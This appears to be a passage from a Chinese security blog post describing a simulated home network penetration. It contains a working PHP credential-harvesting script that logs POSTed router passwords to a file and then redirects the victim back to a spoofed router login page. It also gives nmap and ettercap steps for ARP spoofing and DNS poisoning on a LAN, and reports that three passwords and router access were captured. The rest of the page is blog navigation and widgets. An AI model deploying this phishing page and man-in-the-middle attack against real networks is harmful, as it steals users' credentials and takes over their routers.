+<p>密码会被post到recieve.php，再写个recieve.php接受密码并存储到文件中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">function write($file_name,$data,$mode=&apos;a&apos;)&#123;</span><br><span class="line">    $file = fopen($file_name,$mode);</span><br><span class="line">     </span><br><span class="line">    if(!$file || !is_writable($file_name)) return false;</span><br><span class="line">                 </span><br><span class="line">    fwrite($file,$data);</span><br><span class="line">    fclose($file);</span><br><span class="line">	</span><br><span class="line">    echo &quot;&lt;script&gt; alert(&apos;密码错误,请重新登陆&apos;) &lt;/script&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;script&gt;location.href= &apos;http://192.168.1.103/TL-WR842N.htm&apos;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">echo write(&apos;password.txt&apos;,json_encode($_POST[&apos;password&apos;]));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>ok，准备就绪，进行dns投毒：<br><br><br>ifconfig发现在192.168.1.0/24网段<br>nmap -sn 192.168.1.0/24进行内网主机发现<br>gedit /etc/e  ttercap/etter.dns设置好dns欺骗<br>ettercap -G打开ettercap，选择网卡，扫描主机，选择好目标，再选择攻击插件为DNSspoof，然后选择arp欺骗，勾上第一个勾，开始sniffing<br>(进入受害者视角)<br><img src="/images/jt2.gif" alt=""><br><br><br>打开服务器，就看到了存在password.txt里的密码<br><img src="/images/jt4.PNG" alt="">一共输了3次密码，全部记录了下来<br>至此拿到路由器权限。</p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/09/20/画了个信息收集的脑图/" title= "画了个信息收集的脑图">
+                    <div class="prevTitle">画了个信息收集的脑图</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zOTk3OS8xNjUwNg==>
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:xpf1996cc@126.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/thr0cyte" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/assets/qq.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//steamcommunity.com/profiles/76561198419876010/" class="iconfont-archer steam" target="_blank" title=steam></a>
+            
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        
+    </div>
+
+    
+    <div class="busuanzi-container">
+    
+     
+    
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 13
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span><a class="archive-post-title" href= "/2018/10/08/一次模拟家庭网络渗透/" >一次模拟家庭网络渗透</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href= "/2018/09/20/画了个信息收集的脑图/" >画了个信息收集的脑图</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/27</span><a class="archive-post-title" href= "/2018/08/27/安恒杯八月赛应急响应流量包分析writeup/" >安恒杯八月赛应急响应流量包分析writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href= "/2018/08/01/security-考后心得/" >security+考后心得</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/24</span><a class="archive-post-title" href= "/2018/07/24/安恒杯7月赛writeup/" >安恒杯7月赛writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span><a class="archive-post-title" href= "/2018/07/02/如何黑掉同局域网的手机/" >如何黑掉同局域网的手机</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/26</span><a class="archive-post-title" href= "/2018/06/26/安恒杯6月赛web题writeup/" >安恒杯6月赛web题writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2018/06/20/记被通信网络设计整惨的两天/" >记被通信网络设计整惨的两天</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/09</span><a class="archive-post-title" href= "/2018/06/09/社工库检索器-py/" >社工库检索器.py</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href= "/2018/06/04/铁人三项企业攻防赛writeup/" >铁人三项企业攻防赛writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/盗取wpa2密码的一个骚思路/" >盗取wpa2密码的一个骚思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span><a class="archive-post-title" href= "/2018/04/27/ddos攻击及检测/" >ddos攻击及检测</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/iscc2018最后一道misc-writeup/" >iscc2018最后一道misc writeup</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="无线渗透"><span class="iconfont-archer">&#xe606;</span>无线渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="内网渗透"><span class="iconfont-archer">&#xe606;</span>内网渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="社工"><span class="iconfont-archer">&#xe606;</span>社工</span>
+    
+        <span class="sidebar-tag-name" data-tags="wifi"><span class="iconfont-archer">&#xe606;</span>wifi</span>
+    
+        <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="iscc"><span class="iconfont-archer">&#xe606;</span>iscc</span>
+    
+        <span class="sidebar-tag-name" data-tags="security+"><span class="iconfont-archer">&#xe606;</span>security+</span>
+    
+        <span class="sidebar-tag-name" data-tags="ddos"><span class="iconfont-archer">&#xe606;</span>ddos</span>
+    
+        <span class="sidebar-tag-name" data-tags="抓包"><span class="iconfont-archer">&#xe606;</span>抓包</span>
+    
+        <span class="sidebar-tag-name" data-tags="安恒杯"><span class="iconfont-archer">&#xe606;</span>安恒杯</span>
+    
+        <span class="sidebar-tag-name" data-tags="信息收集"><span class="iconfont-archer">&#xe606;</span>信息收集</span>
+    
+        <span class="sidebar-tag-name" data-tags="脑图"><span class="iconfont-archer">&#xe606;</span>脑图</span>
+    
+        <span class="sidebar-tag-name" data-tags="中间人"><span class="iconfont-archer">&#xe606;</span>中间人</span>
+    
+        <span class="sidebar-tag-name" data-tags="dns投毒"><span class="iconfont-archer">&#xe606;</span>dns投毒</span>
+    
+        <span class="sidebar-tag-name" data-tags="arp欺骗"><span class="iconfont-archer">&#xe606;</span>arp欺骗</span>
+    
+        <span class="sidebar-tag-name" data-tags="反弹shell"><span class="iconfont-archer">&#xe606;</span>反弹shell</span>
+    
+        <span class="sidebar-tag-name" data-tags="安卓"><span class="iconfont-archer">&#xe606;</span>安卓</span>
+    
+        <span class="sidebar-tag-name" data-tags="wpa2"><span class="iconfont-archer">&#xe606;</span>wpa2</span>
+    
+        <span class="sidebar-tag-name" data-tags="应急响应"><span class="iconfont-archer">&#xe606;</span>应急响应</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="社工库"><span class="iconfont-archer">&#xe606;</span>社工库</span>
+    
+        <span class="sidebar-tag-name" data-tags="铁人三项"><span class="iconfont-archer">&#xe606;</span>铁人三项</span>
+    
+        <span class="sidebar-tag-name" data-tags="网络"><span class="iconfont-archer">&#xe606;</span>网络</span>
+    
+        <span class="sidebar-tag-name" data-tags="acl"><span class="iconfont-archer">&#xe606;</span>acl</span>
+    
+        <span class="sidebar-tag-name" data-tags="nat"><span class="iconfont-archer">&#xe606;</span>nat</span>
+    
+        <span class="sidebar-tag-name" data-tags="ospf"><span class="iconfont-archer">&#xe606;</span>ospf</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="无线渗透"><span class="iconfont-archer">&#xe60a;</span>无线渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
+    
+        <span class="sidebar-category-name" data-categories="脑图"><span class="iconfont-archer">&#xe60a;</span>脑图</span>
+    
+        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="编程"><span class="iconfont-archer">&#xe60a;</span>编程</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
